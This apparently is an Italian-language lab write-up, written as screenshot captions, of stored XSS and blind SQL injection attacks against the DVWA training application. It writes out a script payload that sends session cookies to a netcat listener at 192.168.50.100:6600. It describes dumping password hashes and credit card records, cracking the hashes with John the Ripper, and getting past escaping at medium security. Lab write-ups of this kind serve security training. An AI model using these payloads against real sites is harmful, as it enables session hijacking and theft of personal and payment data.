IMMAGINI DA 01 A 04 RELATIVE A XSS STORED

IMMAGINI DA 05 A 14 RELATIVE A SQLi (Blind)

# 01 
Nel XSS stored abbiamo trovato una limitazione, ovvero la lunghezza massima del messaggio, impostata a 50 caratteri
# 02 
Il file è facilmente modificabile, portando il tutto a 500 caratteri, per poter inserire lo script seguente: <script>window.location="http://192.168.50.100:6600/?cookie"+document.cookie</script>
# 03 
Con netcat in modalità listen sulla porta 6600, effettuiamo un accesso sulla pagina xss stored, per poter catturare i cookie di sessione.
# 04 
Se proviamo ad accedere alla pagina xss stored senza il nostro server in ascolto, giustamente, ci dice che non può stabilire una connessione. 
N.B. TUTTO QUESTO FUNZIONA ANCHE CON SECURITY LEVEL IMPOSTATO A MEDIUM.

# 05 
Attraverso la query visibile nel campo ID recuperiamo tutte le tabelle presenti sul server.
# 06
Attraverso la query visibile nel campo ID recuperiamo le colonne della tabella users, ovvero quella che ci interessa per recuperare le password.
# 07
Attraverso la query visibile nel campo ID recuperiamo i record degli attributi user e password. Purtroppo, le password sono cifrate. Successivamente le andremo a decifrare. Continuiamo a cercare altri dati sensibili.
# 08 
Cerchiamo i nomi di tutti i database presenti sul server, per poter trovare materiale sensibile presente in altri database, e non solo in DVWA. La tabella credit_cards nel database OWASP10 ci salta subito all'occhio.
# 09
Attraverso la query visibile nel campo ID recuperiamo il nome delle colonne della tabella credit_cards.
# 10/11 
Troviamo i dati relativi alle carte di credito degli utenti, tra cui numero carta, ccv e data di scadenza. Da qui è facilmente intuibile che tutti i dati all'interno di questo server sono stati compromessi.
# 12
Grazie a john the ripper, decodifichiamo le password precedentemente trovate.
# 13
Possiamo notare che anche la pagina SQLi (blind) è facilmente attaccabile con un attacco xss, usando uno script che facilmente ci permette di avere i cookie di sessione. Basta mettere un valore valido, come ad esempio 1, 
come si può vedere nell'immagine, e successivamente inserire uno script come il seguente : 1<script>alert(document.cookie)</script>
# 14 
Attraverso la query visibile nel campo ID riusciamo a crackare le passworda anche con security level impostato su medium, in quanto, come è possibile vedere dal codice sorgente, $id = mysql_real_escape_string($id) fa la sanitizzazione dei caratteri speciali. 
togliendo le virgolette alte, la query passa e dà in output comunque user e password.
